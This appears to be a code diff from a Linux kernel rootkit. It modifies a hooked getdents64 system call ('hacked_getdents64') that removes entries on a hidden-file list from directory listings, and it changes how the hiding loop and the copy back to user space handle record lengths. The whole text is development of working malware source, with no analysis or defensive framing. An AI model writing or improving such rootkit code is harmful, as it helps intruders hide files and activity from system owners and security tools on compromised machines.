@@ -139,13 +139,14 @@ getdents64_ptr orig_getdents64;
 asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                  unsigned int count)
 {
-	int result, bp;
+	int orig_result, result, bp;
 	struct hidden_file *ptr;
 	char *kdirp; // char buffer so we can do pointer arithmetic by byte
 	struct linux_dirent64 *d;
 
 	// run real getdents64 
-	result = (*orig_getdents64)(fd,dirp,count);
+	orig_result = (*orig_getdents64)(fd,dirp,count);
+	result = orig_result;
 
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,result))
@@ -165,16 +166,17 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 						result - bp - d->d_reclen);
 					result -= d->d_reclen;
 					bp -= d->d_reclen;
+					goto doneHiding;
 				}
 			}
-			bp += d->d_reclen;
+			doneHiding: bp += d->d_reclen;
 		}
 	}
 
 	// copy from kernel to userspace
 	if (!access_ok(VERIFY_WRITE,dirp,result))
 		return -1;
-	if (copy_to_user(dirp,kdirp,result))
+	if (copy_to_user(dirp,kdirp,orig_result))
 		return -1;
 	kfree(kdirp);
 
